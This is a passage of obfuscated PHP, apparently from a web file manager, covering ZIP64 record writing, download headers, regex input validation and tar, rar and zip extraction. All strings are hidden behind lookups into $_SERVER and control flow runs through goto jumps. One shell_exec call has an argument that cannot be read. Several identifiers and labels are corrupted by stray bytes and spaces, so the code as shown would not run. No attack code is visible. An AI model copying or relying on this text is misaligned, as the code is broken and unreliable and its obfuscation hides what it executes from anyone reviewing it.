function addCdr64Eof() { goto aÄÍ„«; bĞŠë¾¤…Ÿ: $E³·ÁÏ˜Õß = $this->ofs; $aÜÇö°ùƒÏ = array(array($fËõÂÆ¼Ê[2022], static::ZIP64_CDR_EOF_SIGNATURE), array($fËõÂÆ¼Ê[2024], 44), array($fËõÂÆ¼Ê[2023], static::ZIP_VERSION_64), array($fËõÂÆ¼Ê[2023], static::ZIP_VERSION_64), array($fËõÂÆ¼Ê[2022], 0), array($fËõÂÆ¼Ê[2022], 0), array($fËõÂÆ¼Ê[2024], $EŠ—šÎøµá), array($fËõÂÆ¼Ê[2024], $EŠ—šÎøµá), array($fËõÂÆ¼Ê[2024], $aÁˆğÙ˜Âê), array($fËõÂÆ¼Ê[2024], $E³·ÁÏ˜Õß)); $Cöœğ‘²©Î = $this->packFields($aÜÇö°ùƒÏ); goto CìÙòù’á; CìÙòù’á: $this->send($Cöœğ‘²©Î); goto cŠ¡Áğ¬ì‰; aÄÍ„«: $fËõÂÆ¼Ê =& $_SERVER[çŞáÓæÚô‚Ô‡]; $EŠ—šÎøµá = count($this->files); $aÁˆğÙ˜Âê = $this->cdr_ofs; goto bĞŠë¾¤…Ÿ; cŠ¡Áğ¬ì‰: } protected function addCdr64Locator() { goto a²…¡í­‘; E—˜Š·Üºâ: $this->send($aÌÎÙ°ô¬Ñ); goto C ¦ªô“¼; c¨ÃØ™»Í¼: $D¦àÉ¨Ú‘Û = $this->ofs; $cÇ¬­Æ³è‘ = array(array($AÛ‹ŞÖÑä[2022], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($AÛ‹ŞÖÑä[2022], 0), array($AÛ‹ŞÖÑä[2024], $D¦àÉ¨Ú‘Û + $dÒ¥á‡ÌŸ), array($AÛ‹ŞÖÑä[2022], 1)); $aÌÎÙ°ô¬Ñ = $this->packFields($cÇ¬­Æ³è‘); goto E—˜Š·Üºâ; a²…¡í­‘: $AÛ‹ŞÖÑä =& $_SERVER[çŞáÓæÚô‚Ô‡]; $b¤àæé¨ñÑ = count($this->files); $dÒ¥á‡ÌŸ = $this->cdr_ofs; goto c¨ÃØ™»Í¼; C ¦ªô“¼: } protected function addCdrEof() { goto aØô†¶·÷¶; aØô†¶·÷¶: $dœõì›„ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bˆ”ÙÅ’ « = count($this->files); $bÉö²Ûµğì = $this->cdr_ofs; goto A¯ÒÄ´±¯´; A¯ÒÄ´±¯´: $cå’éÛƒôå = $this->ofs; $Cˆ§ì°ƒÃœ = $dœõì›„[43]; $d¦çáÊÒïí = array(array($dœõì›„[2022], static::CDR_EOF_SIGNATURE), array($dœõì›„[2023], 0), array($dœõì›„[2023], 0), array($dœõì›„[2023], $bˆ”ÙÅ’ «), array($dœõì›„[2023], $bˆ”ÙÅ’ «), array($dœõì›„[2022], 4294967295), array($dœõì›„[2022], 4294967295), array($dœõì›„[2023], strlen($Cˆ§ì°ƒÃœ))); goto d©²„ÖÈ ; d©²„ÖÈ : $aåØĞ‡À¶ª = $this->packFields($d¦çáÊÒïí) . $Cˆ§ì°ƒÃœ; $this->send($aåØĞ‡À¶ª); goto cÚ‚ó½ÏáÛ; cÚ‚ó½ÏáÛ: } protected function addCdr() { foreach ($this->files as $f´ßô“Æï•) { $this->addCdrFile($f´ßô“Æï•); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $cæ‚Õ‡öÌ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $F»åš‘çªË = $cæ‚Õ‡öÌ[212]; if ($this->outputName) { $cµ„æ¼ŸÑÒ = trim(str_replace(array($cæ‚Õ‡öÌ[123], $cæ‚Õ‡öÌ[65], $cæ‚Õ‡öÌ[103], $cæ‚Õ‡öÌ[77], $cæ‚Õ‡öÌ[11], $cæ‚Õ‡öÌ[999]), $cæ‚Õ‡öÌ[43], $this->outputName)); $dØÍ†‚ºª = rawurlencode($cµ„æ¼ŸÑÒ); $F»åš‘çªË .= "\73\40\146\x69\x6c\145\x6e\141\x6d\x65\x2a\x3d\x75\164\x66\x2d\x38\47\47{$dØÍ†‚ºª}"; } $b¿Œ´¶Õ¶œ = array($cæ‚Õ‡öÌ[209] => $cæ‚Õ‡öÌ[2025], $cæ‚Õ‡öÌ[2026] => $F»åš‘çªË, $cæ‚Õ‡öÌ[2027] => $cæ‚Õ‡öÌ[2028], $cæ‚Õ‡öÌ[2029] => $cæ‚Õ‡öÌ[2030], $cæ‚Õ‡öÌ[2031] => $cæ‚Õ‡öÌ[2032]); foreach ($b¿Œ´¶Õ¶œ as $a×Šïó³ => $Cô³¾˜Æãæ) { header($a×Šïó³ . $cæ‚Õ‡öÌ[886] . $Cô³¾˜Æãæ); } } protected function send($e¼šì¦“¥¯) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $e¼šì¦“¥¯); } protected final function dosTime($A¿æíŒéš) { $bÎèÀ²Ş³ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $AøØª¾Ãê° = getdate($A¿æíŒéš); if ($AøØª¾Ãê°[$bÎèÀ²Ş³[1732]] < 1980) { $AøØª¾Ãê° = array($bÎèÀ²Ş³[1732] => 1980, $bÎèÀ²Ş³[2033] => 1, $bÎèÀ²Ş³[2034] => 1, $bÎèÀ²Ş³[2035] => 0, $bÎèÀ²Ş³[2036] => 0, $bÎèÀ²Ş³[2037] => 0); } $AøØª¾Ãê°[$bÎèÀ²Ş³[1732]] -= 1980; return $AøØª¾Ãê°[$bÎèÀ²Ş³[1732]] << 25 | $AøØª¾Ãê°[$bÎèÀ²Ş³[2033]] << 21 | $AøØª¾Ãê°[$bÎèÀ²Ş³[2034]] << 16 | $AøØª¾Ãê°[$bÎèÀ²Ş³[2035]] << 11 | $AøØª¾Ãê°[$bÎèÀ²Ş³[2036]] << 5 | $AøØª¾Ãê°[$bÎèÀ²Ş³[2037]] >> 1; } protected function packFields($aÜ·ŠîæÔİ) { $añ…°„Àì =& $_SERVER[çŞáÓæÚô‚Ô‡]; $F¾¸ˆÉÊµÉ = $añ…°„Àì[43]; $fˆ–¼ÆŒ¦ª = array(); foreach ($aÜ·ŠîæÔİ as $c«÷–Ò´) { $F¾¸ˆÉÊµÉ .= $c«÷–Ò´[0]; $fˆ–¼ÆŒ¦ª[] = $c«÷–Ò´[1]; } array_unshift($fˆ–¼ÆŒ¦ª, $F¾¸ˆÉÊµÉ); return call_user_func_array($añ…°„Àì[2038], $fˆ–¼ÆŒ¦ª); } protected function filterFilename($Fìå¶ä¬º) { $C«ÒïĞ =& $_SERVER[çŞáÓæÚô‚Ô‡]; return str_replace(array($C«ÒïĞ[103], $C«ÒïĞ[4], $C«ÒïĞ[186], $C«ÒïĞ[79], $C«ÒïĞ[123], $C«ÒïĞ[931], $C«ÒïĞ[934], $C«ÒïĞ[280]), $C«ÒïĞ[80], $Fìå¶ä¬º); } } goto FÇÜèäãÏ; AÙ›¥™¤ö†: if (!function_exists($_SERVER[çŞáÓæÚô‚Ô‡][1885])) { function imagecreatefrombmp($aÀˆñóòª†) { return ImageGdBMP::load($aÀˆñóòª†); } } class Input { public static function getArray($e†ì¨…¿ù†) { goto eæèÊ´šª; eæèÊ´šª: $E‚Ã¯Û•¬ =& $_SERVER[çŞáÓæÚô‚Ô‡]; global $in; $f«ÕÃ–èİğ = array(); goto aº×æŸË¥; b»¾±Ø«êƒ: if (count($EóÙæöÆÔ™) > 0) { show_json(implode($E‚Ã¯Û•¬[1890], $EóÙæöÆÔ™), !1); } return $f«ÕÃ–èİğ; goto cãÁ›ôß‘; aº×æŸË¥: $EóÙæöÆÔ™ = array(); $D­©½óˆÑ¨ = LNG($E‚Ã¯Û•¬[1886]); foreach ($e†ì¨…¿ù† as $eøÜ©¸á¸Ø => $e¶¯ÌØ¹ªë) { goto f·Ã”ˆÏ; fÇìø‘­ò•: if (isset($e¶¯ÌØ¹ªë[$E‚Ã¯Û•¬[1889]]) && !self::check($in[$eøÜ©¸á¸Ø], $e¶¯ÌØ¹ªë[$E‚Ã¯Û•¬[1889]], $cÑêôó®—¼)) { if (array_key_exists($E‚Ã¯Û•¬[1888], $e¶¯ÌØ¹ªë)) { if (!is_null($e¶¯ÌØ¹ªë[$E‚Ã¯Û•¬[1888]])) { $f«ÕÃ–èİğ[$b®äš¤ÂŠ¤] = $e¶¯ÌØ¹ªë[$E‚Ã¯Û•¬[1888]]; } } else { $EóÙæöÆÔ™[] = $e‡„ÚÚ„›‡; } continue; } $f«ÕÃ–èİğ[$b®äš¤ÂŠ¤] = $in[$eøÜ©¸á¸Ø]; goto c…Òö¡Ö‰â; f·Ã”ˆÏ: $e‡„ÚÚ„›‡ = _get($e¶¯ÌØ¹ªë, $E‚Ã¯Û•¬[1253], $D­©½óˆÑ¨ . $E‚Ã¯Û•¬[886] . $eøÜ©¸á¸Ø); $b®äš¤ÂŠ¤ = $eøÜ©¸á¸Ø; if (isset($e¶¯ÌØ¹ªë[$E‚Ã¯Û•¬[1887]]) && $e¶¯ÌØ¹ªë[$E‚Ã¯Û•¬[1887]]) { $b®äš¤ÂŠ¤ = $e¶¯ÌØ¹ªë[$E‚Ã¯Û•¬[1887]]; } goto DñªŸî•ÖÖ; DñªŸî•ÖÖ: if (!array_key_exists($eøÜ©¸á¸Ø, $in)) { if (array_key_exists($E‚Ã¯Û•¬[1888], $e¶¯ÌØ¹ªë)) { if (!is_null($e¶¯ÌØ¹ªë[$E‚Ã¯Û•¬[1888]])) { $f«ÕÃ–èİğ[$b®äš¤ÂŠ¤] = $e¶¯ÌØ¹ªë[$E‚Ã¯Û•¬[1888]]; } } else { if (isset($e¶¯ÌØ¹ªë[$E‚Ã¯Û•¬[1889]])) { $EóÙæöÆÔ™[] = $e‡„ÚÚ„›‡; } } continue; } if (isset($e¶¯ÌØ¹ªë[$E‚Ã¯Û•¬[1889]]) && $e¶¯ÌØ¹ªë[$E‚Ã¯Û•¬[1889]] == $E‚Ã¯Û•¬[291]) { $dšõâï…´ = json_decode($in[$eøÜ©¸á¸Ø], !0); if (is_array($dšõâï…´)) { $f«ÕÃ–èİğ[$b®äš¤ÂŠ¤] = $dšõâï…´; } else { if (array_key_exists($E‚Ã¯Û•¬[1888], $e¶¯ÌØ¹ªë)) { if (!is_null($e¶¯ÌØ¹ªë[$E‚Ã¯Û•¬[1888]])) { $f«ÕÃ–èİğ[$b®äš¤ÂŠ¤] = $e¶¯ÌØ¹ªë[$E‚Ã¯Û•¬[1888]]; } } else { $EóÙæöÆÔ™[] = $e‡„ÚÚ„›‡; } } continue; } $cÑêôó®—¼ = _get($e¶¯ÌØ¹ªë, $E‚Ã¯Û•¬[1019]); goto fÇìø‘­ò•; c…Òö¡Ö‰â: } goto b»¾±Ø«êƒ; cãÁ›ôß‘: } public static function reg($BŒÃÇ¯…‹‹ = "\162\145\x71\165\x69\162\145") { static $eñÁŠ¼ÜŒÍ = array("\x72\x65\x71\165\151\x72\x65" => "\56\53", "\x6e\x75\x6d\142\x65\x72" => "\134\x64\53", "\151\x6e\x74\x65\x67\145\162" => "\x5c\144\x2b", "\150\145\x78" => "\133\60\55\x39\101\55\x46\x61\55\146\x5d\x2b", "\151\x6e\164" => "\133\x2d\134\x2b\x5d\77\x5c\144\53", "\142\x6f\157\154" => "\x30\x7c\61", "\146\154\x6f\x61\164" => "\x5b\x2d\134\x2b\x5d\77\134\144\53\50\134\56\134\x64\53\x29\77", "\x65\156\147\154\x69\163\x68" => "\x5b\101\55\132\x61\55\172\40\x5d\x2b", "\143\150\151\x6e\x65\x73\145" => "\x5b\134\x78\x7b\64\x65\x30\60\175\55\x5c\170\173\x39\x66\x61\65\x7d\135\x2b", "\x68\x61\163\x43\150\151\156\x65\x73\145" => "\57\x28\133\134\170\173\x34\x65\60\60\175\55\x5c\170\173\71\x66\x61\65\x7d\x5d\53\51\57\165", "\x65\x6d\x61\x69\154" => "\134\167\53\50\133\x5c\56\134\55\135\134\x77\53\x29\52\134\100\x5c\167\x2b\x28\133\x5c\56\134\55\x5d\134\167\x2b\51\52\x5c\x2e\134\167\53", "\160\x68\157\156\145" => "\61\133\x33\x2d\x39\x5d\x5c\x64\x7b\71\175", "\164\145\154\160\150\157\x6e\x65" => "\x28\x5c\50\134\144\x7b\63\54\x34\175\134\51\x7c\134\x64\173\63\54\x34\x7d\x2d\174\x5c\x73\x29\77\x5c\144\x7b\67\x2c\x31\64\175", "\165\x72\x6c" => "\x28\150\164\x74\x70\x7c\x66\164\x70\x7c\x68\164\164\x70\163\51\x3a\x5c\x2f\x5c\57\x5b\134\167\x5c\55\137\135\53\50\x5c\56\133\134\167\134\x2d\137\x5d\53\x29\53\50\133\134\167\134\x2d\134\56\x2c\100\77\136\x3d\x25\46\x3a\x5c\x2f\176\x5c\53\x23\135\x2a\x5b\x5c\x77\x5c\x2d\134\100\77\x5e\75\45\x26\134\57\x7e\134\53\x23\x5d\51\x3f", "\165\x72\154\106\165\x6c\154" => "\x5b\141\55\x7a\101\x2d\x7a\x5d\x2b\x3a\134\x2f\x5c\57\133\136\x5c\163\135\x2a", "\151\x70" => "\50\134\144\x7b\61\x2c\63\175\134\x2e\51\x7b\x33\175\x28\x5c\x64\x7b\x31\x2c\63\x7d\x29", "\172\x69\x70" => "\x5b\x31\x2d\71\135\134\144\x7b\65\x7d\50\x3f\41\134\x64\51", "\151\144\103\x61\162\144" => "\x28\134\144\x7b\x31\65\x7d\51\x7c\x28\x5c\x64\x7b\x31\x37\175\50\x5c\144\174\x58\x7c\x78\x29\51", "\143\157\154\157\x72" => "\43\50\x5b\60\x2d\x39\101\55\106\141\55\146\135\x7b\63\175\174\133\60\55\71\x41\x2d\x46\x61\55\146\135\x7b\x36\175\x29", "\x74\x69\x6d\x65" => "\x28\x5b\60\55\x31\135\x5c\x64\174\x32\133\60\x2d\64\135\51\72\x5b\x30\55\65\x5d\x5c\144", "\x64\x61\164\x65" => "\134\144\173\x34\175\x5b\55\x5c\57\x5d\x3f\50\x30\x5b\61\x2d\x39\x5d\x7c\x31\x5b\60\x2d\62\135\51\x5b\x2d\134\x2f\135\x3f\x28\x5b\60\x2d\62\135\134\144\x7c\63\x5b\60\x2d\61\135\51", "\x64\141\164\145\124\151\155\x65" => "\x5c\x64\173\x34\175\x5b\x2d\x5c\57\135\x3f\50\x30\x5b\61\55\x39\135\x7c\x31\x5b\60\55\62\x5d\51\133\x2d\x5c\x2f\x5d\x3f\x28\133\x30\55\x32\135\x5c\144\174\x33\x5b\x30\55\61\x5d\51\134\x73\x2b\x28\133\60\x2d\x31\135\x5c\x64\174\62\133\60\55\64\x5d\x29\72\x5b\x30\55\65\x5d\x5c\144", "\160\141\163\x73\167\x6f\162\x64" => "\x28\77\x3d\56\x2a\134\x64\51\x28\77\75\x2e\x2a\133\141\55\x7a\x5d\x29\x28\77\75\56\x2a\x5b\101\55\x5a\x5d\x29\56\173\70\x2c\62\60\x7d", "\153\145\x79" => "\133\x41\55\x5a\141\55\172\x30\55\71\x5f\x5c\x2d\x5c\56\x5d\53", "\153\145\x79\x46\x75\x6c\x6c" => "\133\101\55\x5a\x61\55\x7a\x30\x2d\71\x5f\134\x2d\134\x2e\x5c\x73\x2c\135\x2b"); if (!$BŒÃÇ¯…‹‹) { return $eñÁŠ¼ÜŒÍ; } return $eñÁŠ¼ÜŒÍ[$BŒÃÇ¯…‹‹]; } public static function check($eçÔ¨¯¨Ë…, $bÄİÂ£é®İ, $Cïö˜Æ¥ = null) { $F–Òƒ¹ø“µ =& $_SERVER[çŞáÓæÚô‚Ô‡]; switch ($bÄİÂ£é®İ) { case $F–Òƒ¹ø“µ[17]: return in_array($eçÔ¨¯¨Ë…, $Cïö˜Æ¥); break; case $F–Òƒ¹ø“µ[1891]: return floatval($eçÔ¨¯¨Ë…) > $Cïö˜Æ¥; break; case $F–Òƒ¹ø“µ[1892]: return floatval($eçÔ¨¯¨Ë…) < $Cïö˜Æ¥; break; case $F–Òƒ¹ø“µ[334]: return strlen($eçÔ¨¯¨Ë…) >= $Cïö˜Æ¥[0] && strlen($eçÔ¨¯¨Ë…) <= $Cïö˜Æ¥[1]; break; case $F–Òƒ¹ø“µ[334]: if (is_array($Cïö˜Æ¥)) { return strlen($eçÔ¨¯¨Ë…) >= $Cïö˜Æ¥[0] && strlen($eçÔ¨¯¨Ë…) <= $Cïö˜Æ¥[1]; break; } else { return strlen($eçÔ¨¯¨Ë…) == $Cïö˜Æ¥; break; } case $F–Òƒ¹ø“µ[330]: return floatval($eçÔ¨¯¨Ë…) >= $Cïö˜Æ¥[0] && floatval($eçÔ¨¯¨Ë…) <= $Cïö˜Æ¥[1]; break; } $Cè¤©è«ô = self::reg(!1); $bÄİÂ£é®İ = isset($Cè¤©è«ô[$bÄİÂ£é®İ]) ? $Cè¤©è«ô[$bÄİÂ£é®İ] : $bÄİÂ£é®İ; if (substr($bÄİÂ£é®İ, 0, 1) != $F–Òƒ¹ø“µ[18]) { $bÄİÂ£é®İ = $F–Òƒ¹ø“µ[1893] . $bÄİÂ£é®İ . $F–Òƒ¹ø“µ[1894]; } return preg_match($bÄİÂ£é®İ, $eçÔ¨¯¨Ë…) === 1; } public static function get($c¯¨™Êäé›, $FŸ»“´Öè¡ = null, $bİÑ®’Ê¼ = null, $eÂ‚œĞÃ‰‡ = null) { goto cñÉù¦§; aÎÊØ‡Ã”: if (!is_null($eÂ‚œĞÃ‰‡)) { $Eì×„Š£Áª[$dàŠçÊ¥óß[1019]] = $eÂ‚œĞÃ‰‡; } if (!is_null($FŸ»“´Öè¡)) { $Eì×„Š£Áª[$dàŠçÊ¥óß[1889]] = $FŸ»“´Öè¡; } $D¿ø† µå = Input::getArray(array($c¯¨™Êäé› => $Eì×„Š£Áª)); goto Dãö”Ø×šİ; cñÉù¦§: $dàŠçÊ¥óß =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Eì×„Š£Áª = array(); if (!is_null($bİÑ®’Ê¼)) { $Eì×„Š£Áª[$dàŠçÊ¥óß[44]] = $bİÑ®’Ê¼; } goto aÎÊØ‡Ã”; Dãö”Ø×šİ: return $D¿ø† µå[$c¯¨™Êäé›]; goto C‰Ó¶ñÁ˜; C‰Ó¶ñÁ˜: } } class KodArchive { static function init() { goto F—‹ö¹‹¤°; aæãÎŒö: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $A±¬îˆƒ‚œ[1901]; require_once ARCHIVE_LIB . $A±¬îˆƒ‚œ[1902]; goto BÃŸ…†¿Ø©; F—‹ö¹‹¤°: $A±¬îˆƒ‚œ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (defined($A±¬îˆƒ‚œ[1895])) { return; } define($A±¬îˆƒ‚œ[1895], SDK_DIR . $A±¬îˆƒ‚œ[1896]); goto CØÉâ¹Ô; c÷ÊâÙŠÎ‡: require_once ARCHIVE_LIB . $A±¬îˆƒ‚œ[1906]; goto Fà‚ŠŒÎ½å; BÃŸ…†¿Ø©: require_once ARCHIVE_LIB . $A±¬îˆƒ‚œ[1903]; require_once ARCHIVE_LIB . $A±¬îˆƒ‚œ[1904]; require_once ARCHIVE_LIB . $A±¬îˆƒ‚œ[1905]; goto c÷ÊâÙŠÎ‡; CØÉâ¹Ô: define($A±¬îˆƒ‚œ[1897], TEMP_FILES); define($A±¬îˆƒ‚œ[1898], TEMP_FILES); define($A±¬îˆƒ‚œ[1899], $A±¬îˆƒ‚œ[1900]); goto aæãÎŒö; Fà‚ŠŒÎ½å: } static function checkIfType($FøÖá¡«Ô, $b½ø°·¶”) { goto FµÚ´­°œ©; FµÚ´­°œ©: $bêåñª¦Ÿ» =& $_SERVER[çŞáÓæÚô‚Ô‡]; self::init(); $EÉ¿…Ä¸†Š = array($bêåñª¦Ÿ»[310] => array($bêåñª¦Ÿ»[310], $bêåñª¦Ÿ»[1907], $bêåñª¦Ÿ»[1908], $bêåñª¦Ÿ»[1909]), $bêåñª¦Ÿ»[1910] => array($bêåñª¦Ÿ»[1910], $bêåñª¦Ÿ»[1911], $bêåñª¦Ÿ»[1050], $bêåñª¦Ÿ»[1048]), $bêåñª¦Ÿ»[1052] => array($bêåñª¦Ÿ»[1052], $bêåñª¦Ÿ»[1912], $bêåñª¦Ÿ»[1913], $bêåñª¦Ÿ»[1914], $bêåñª¦Ÿ»[1915], $bêåñª¦Ÿ»[1916], $bêåñª¦Ÿ»[1917])); goto Bøó§ƒÜª; cªèğ±¥ÈÍ: return $f’Š”“Íº•; goto F¦’Ñ¾ƒ; Bøó§ƒÜª: $f’Š”“Íº• = in_array($FøÖá¡«Ô, $EÉ¿…Ä¸†Š[$b½ø°·¶”]); if ($f’Š”“Íº• && ($b½ø°·¶” == $bêåñª¦Ÿ»[310] || $b½ø°·¶” == $bêåñª¦Ÿ»[1910]) && (!function_exists($bêåñª¦Ÿ»[1918]) || !function_exists($bêåñª¦Ÿ»[1919]))) { show_tips($bêåñª¦Ÿ»[1920]); } if ($f’Š”“Íº• && $b½ø°·¶” == $bêåñª¦Ÿ»[1052] && (!function_exists($bêåñª¦Ÿ»[1921]) || !strstr(shell_exec($bêåñª¦Ÿ»[1922]), $bêåñª¦Ÿ»[1923]))) { show_tips($bêåñª¦Ÿ»[1924]); } goto cªèğ±¥ÈÍ; F¦’Ñ¾ƒ: } static function listContent($BÔÕŒ–éîÅ, $EŠä‡Óøƒ´ = true) { $D´‰Èñà…Ñ =& $_SERVER[çŞáÓæÚô‚Ô‡]; self::init(); $f…Ô„ùó´‹ = !empty($GLOBALS[$D´‰Èñà…Ñ[1056]]) ? $GLOBALS[$D´‰Èñà…Ñ[1056]] : get_path_ext($BÔÕŒ–éîÅ); $F÷œÌ…·®Œ = !1; if (self::checkIfType($f…Ô„ùó´‹, $D´‰Èñà…Ñ[1910])) { $FÉ’ïŠÅ¾ò = PclTarList($BÔÕŒ–éîÅ, $f…Ô„ùó´‹); $F÷œÌ…·®Œ = array(); for ($FÒÃìª”ßá = 0; $FÒÃìª”ßá < count($FÉ’ïŠÅ¾ò); $FÒÃìª”ßá++) { $bİ“†–ÉÊ = $FÉ’ïŠÅ¾ò[$FÒÃìª”ßá]; if ($bİ“†–ÉÊ[$D´‰Èñà…Ñ[1925]] == $D´‰Èñà…Ñ[1926] || $bİ“†–ÉÊ[$D´‰Èñà…Ñ[1925]] == $D´‰Èñà…Ñ[1927]) { continue; } if ($EŠä‡Óøƒ´) { $bİ“†–ÉÊ[$D´‰Èñà…Ñ[1928]] = ltrim($bİ“†–ÉÊ[$D´‰Èñà…Ñ[1928]], $D´‰Èñà…Ñ[1162]); } if ($bİ“†–ÉÊ[$D´‰Èñà…Ñ[1925]] == $D´‰Èñà…Ñ[1929]) { $bİ“†–ÉÊ[$D´‰Èñà…Ñ[86]] = !0; } else { $bİ“†–ÉÊ[$D´‰Èñà…Ñ[86]] = !1; } $bİ“†–ÉÊ[$D´‰Èñà…Ñ[1043]] = $FÒÃìª”ßá; $F÷œÌ…·®Œ[] = $bİ“†–ÉÊ; } } else { if (self::checkIfType($f…Ô„ùó´‹, $D´‰Èñà…Ñ[1052])) { $A°ª»Ë¯ß = kodRarArchive::listContent($BÔÕŒ–éîÅ); if (!$A°ª»Ë¯ß[$D´‰Èñà…Ñ[1039]]) { return $A°ª»Ë¯ß; } else { $F÷œÌ…·®Œ = $A°ª»Ë¯ß[$D´‰Èñà…Ñ[1041]]; } } else { if (kodZipArchive::support($D´‰Èñà…Ñ[363])) { $F÷œÌ…·®Œ = kodZipArchive::listContent($BÔÕŒ–éîÅ); } else { $C³î‘ÙîĞõ = new PclZip($BÔÕŒ–éîÅ); $F÷œÌ…·®Œ = $C³î‘ÙîĞõ->listContent(); } } } if ($F÷œÌ…·®Œ) { $f¼…™„‰•İ = unzip_charset_get($F÷œÌ…·®Œ); $EŠä‡Óøƒ´ = $EŠä‡Óøƒ´ && function_exists($D´‰Èñà…Ñ[75]); for ($FÒÃìª”ßá = 0; $FÒÃìª”ßá < count($F÷œÌ…·®Œ); $FÒÃìª”ßá++) { $F÷œÌ…·®Œ[$FÒÃìª”ßá][$D´‰Èñà…Ñ[1928]] = str_replace(array($D´‰Èñà…Ñ[1079], $D´‰Èñà…Ñ[1930]), $D´‰Èñà…Ñ[772], $F÷œÌ…·®Œ[$FÒÃìª”ßá][$D´‰Èñà…Ñ[1928]]); if ($EŠä‡Óøƒ´) { $F÷œÌ…·®Œ[$FÒÃìª”ßá][$D´‰Èñà…Ñ[1928]] = iconv_to($F÷œÌ…·®Œ[$FÒÃìª”ßá][$D´‰Èñà…Ñ[1928]], $f¼…™„‰•İ, $D´‰Èñà…Ñ[335]); unset($F÷œÌ…·®Œ[$FÒÃìª”ßá][$D´‰Èñà…Ñ[1931]]); } } return array($D´‰Èñà…Ñ[1039] => !0, $D´‰Èñà…Ñ[1041] => $F÷œÌ…·®Œ); } else { return array($D´‰Èñà…Ñ[1039] => !1, $D´‰Èñà…Ñ[1041] => $F÷œÌ…·®Œ); } } static function extract($eÆË»ÅÆÑß, $aÁ¾ÚÇ³ƒì, $déÔõ Ç = "\x2d\61", &$A‘í©¶µÆÃ = false) { goto Cõ‘—ÈÒÂÀ; dğäñÖ¼¼: if (self::checkIfType($F‰¢‹÷ĞÛ¹, $dÈŒÕÖÙˆ[1910])) { if ($déÔõ Ç != $dÈŒÕÖÙˆ[1038]) { $fÆò‡ÏŸÅÎ = unzip_pre_name($fÆò‡ÏŸÅÎ); $B¥¢íÔõ°á = unzip_pre_name($B¥¢íÔõ°á); $Bä½²İÃš = PclTarExtractList($eÆË»ÅÆÑß, array($fÆò‡ÏŸÅÎ), $aÁ¾ÚÇ³ƒì, $B¥¢íÔõ°á, $F‰¢‹÷ĞÛ¹); } else { $Bä½²İÃš = PclTarExtract($eÆË»ÅÆÑß, $aÁ¾ÚÇ³ƒì, $dÈŒÕÖÙˆ[370], $F‰¢‹÷ĞÛ¹); } return array($dÈŒÕÖÙˆ[1039] => $Bä½²İÃš, $dÈŒÕÖÙˆ[1041] => PclErrorString(!0)); } else { if (self::checkIfType($F‰¢‹÷ĞÛ¹, $dÈŒÕÖÙˆ[1052])) { return kodRarArchive::extract($eÆË»ÅÆÑß, $aÁ¾ÚÇ³ƒì, $F‰¢‹÷ĞÛ¹, $A‘í©¶µÆÃ); } else { if (kodZipArchive::support($dÈŒÕÖÙˆ[1932])) { return kodZipArchive::extract($eÆË»ÅÆÑß, $aÁ¾ÚÇ³ƒì, $A‘í©¶µÆÃ); } else { $fÂîËù¡åŒ = new PclZip($eÆË»ÅÆÑß); if ($déÔõ Ç != $dÈŒÕÖÙˆ[1038]) { $Bä½²İÃš = $fÂîËù¡åŒ->extract(PCLZIP_OPT_PATH, $aÁ¾ÚÇ³ƒì, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $dÈŒÕÖÙˆ[1933], PCLZIP_OPT_BY_NAME, $EœëŞ¿Ø‹ñ[$dÈŒÕÖÙˆ[1928]], PCLZIP_OPT_REMOVE_PATH, $B¥¢íÔõ°á, PCLZIP_OPT_REPLACE_NEWER); } else { $Bä½²İÃš = $fÂîËù¡åŒ->extract(PCLZIP_OPT_PATH, $aÁ¾ÚÇ³ƒì, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $dÈŒÕÖÙˆ[1933], PCLZIP_OPT_REPLACE_NEWER); } return array($dÈŒÕÖÙˆ[1039] => $Bä½²İÃš, $dÈŒÕÖÙˆ[1041] => $fÂîËù¡åŒ->errorName(!0)); } } } return array($dÈŒÕÖÙˆ[1039] => !1, $dÈŒÕÖÙˆ[1041] => $dÈŒÕÖÙˆ[1934]); goto a‡†œÜîƒÓ; Cõ‘—ÈÒÂÀ: $dÈŒÕÖÙˆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; self::init(); $F‰¢‹÷ĞÛ¹ = !empty($GLOBALS[$dÈŒÕÖÙˆ[1056]]) ? $GLOBALS[$dÈŒÕÖÙˆ[1056]] : get_path_ext($eÆË»ÅÆÑß); goto b¬®äÌâÈñ; b¬®äÌâÈñ: $cğ¿‚æ‡Á‹ = self::listContent($eÆË»ÅÆÑß, !1); if (!$cğ¿‚æ‡Á‹[$dÈŒÕÖÙˆ[1039]]) { return $cğ¿‚æ‡Á‹; } if ($déÔõ Ç != $dÈŒÕÖÙˆ[1038]) { goto EÀÀ¤í÷»; Aç´¹³¥½´: if ($GLOBALS[$dÈŒÕÖÙˆ[16]][$dÈŒÕÖÙˆ[1160]] != $dÈŒÕÖÙˆ[335]) { $fÆò‡ÏŸÅÎ = unzip_pre_name($A‘í©¶µÆÃ); } $B¥¢íÔõ°á = get_path_father($A‘í©¶µÆÃ); if ($B¥¢íÔõ°á == $A‘í©¶µÆÃ) { $B¥¢íÔõ°á = $dÈŒÕÖÙˆ[43]; } goto fí…¶Õ‹; fí…¶Õ‹: if ($EœëŞ¿Ø‹ñ[$dÈŒÕÖÙˆ[86]]) { $fÆò‡ÏŸÅÎ = rtrim($fÆò‡ÏŸÅÎ, $dÈŒÕÖÙˆ[18]) . $dÈŒÕÖÙˆ[18]; $A‘í©¶µÆÃ = array($A‘í©¶µÆÃ); } $a‡Ñ¡øØ = str_replace($dÈŒÕÖÙˆ[103], $dÈŒÕÖÙˆ[18], $fÆò‡ÏŸÅÎ); if (substr($a‡Ñ¡øØ, -1) == $dÈŒÕÖÙˆ[18]) { if (!strstr(trim($a‡Ñ¡øØ, $dÈŒÕÖÙˆ[18]), $dÈŒÕÖÙˆ[18])) { $aÁ¾ÚÇ³ƒì = $aÁ¾ÚÇ³ƒì . 